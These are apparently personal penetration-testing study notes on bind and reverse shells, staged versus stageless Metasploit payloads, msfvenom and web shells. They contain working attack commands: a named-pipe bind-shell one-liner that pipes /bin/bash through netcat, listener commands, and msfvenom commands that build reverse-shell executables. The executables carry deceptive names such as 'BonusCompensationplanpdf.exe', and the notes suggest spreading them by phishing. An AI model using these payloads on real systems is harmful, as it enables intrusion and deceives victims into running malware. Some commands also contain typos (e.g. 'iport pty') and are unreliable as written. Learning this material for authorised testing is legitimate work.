
## General concepts 

### Bind Shell 
With a bind shell, the target system has a listener startted and awaits a connection from a pentesters system (attack box)

So in that case we could open up a port on the target and the connect via attacker to the target. See coding snippet 

```bash
# Setup listener on Target machine 
nc -lvnp 7777

# Connect to the target machine using the attacker machine 
nc -nv <ip address> 7777
```

But this is not a proper shell, but rather just a Netcat TCP session. To have an actual bind shell we need to bind a bash shell to the TCP Session like this 
```bash

# Using the following payload on our target machine  
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <ip address> 7777 > /tmp/f

# Connectiong to the target using our attacker machine 
nc -nv <ip address> 7777
```

### Reverse Shell 
With a revers shell, the attack box will hae a listener running, and the target will need to initiate the connection.

```bash
# Setup listening port on Attacker machine
sudo nc -lvnp 443
```


## Staged vs. Stageless Payloads 

**Staged**
payloads create a way for us to send overmore components of our attack. We can think of it like we are "setting the stage" for something even more useful. When run using an exploit module in Metasploit, this payload will send a smalll "stage" that will be executed on the target and then call back to the attack box to download the remainder of the payload over the network, then executes the shellcode to establis a reverse shell. 

**Stageless**
payloads do not have a stage. Take for example this payload `linux/zarch/meterpreter_reverse_tcp`. Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we don not hve acces to much bandwiddth and latency can interfere.

When using metasploit you can see the difference in the naming convention:
```bash
# Stageless payload 
windows/meterpreter_reverse_tcp

# Staged payload 
/windows/meterpreter/reverse_tcp
```

You can see that the "/" is used to separate stages. And With the staged payload you have a separation between the network and the payload.

## Crafting Payloads with MSFvenom

With MSFvenom we are able to generate payload which we could for example distribute via phishing etc. So no direct network connectivity is required! 

```bash
# List possible payloads 
msfvenom -l payloads 

# Building a stageless payload 
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ipaddress> LPORT=<port> -f elf > createbackup.elf

# Building a stageless payload for a windows system 
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe > BonusCompensationplanpdf.exe

```


## Infiltrating Windows 

When trying to infiltrate windows the following payload Types are interessting: 
- DLLs
- Batch
- VBS
- MSI
- Powershell

Tools for Payload Generation are: 
- MSFVenom & Metasploit Framework
- Payload All the Things 
- Mythic C2 Framework
- Nishang
- Darkarmour

Payload Transfer and Execution:
- Impacket
- Payload All the things 
- SMB


## Infiltrationg NIX Shells 

Spawning  interactive shells 
```bash 
# TTY shell using python
python -c 'iport pty; pty.spawn("/bin/sh")'

# bash interactive shell 
/bin/sh -i 

# Perl Shell 
perl -e 'exec "/bin/sh";'

# Vim to Shell 
vim -c ':!/bin/sh'

```

## Infiltrating Web Shells 
A web shell is a browser-based shell session we can use to interact wit hthe underlying operating system of a web server. 
You can use ready made Web Shells from [Laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)


Workflow would be to copy away the shell you need from `/usr/share/laudanum` and then modify it so that it can connect back to you.



## Links 

- [Reverse Shell Cheat Sheet ](https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/)


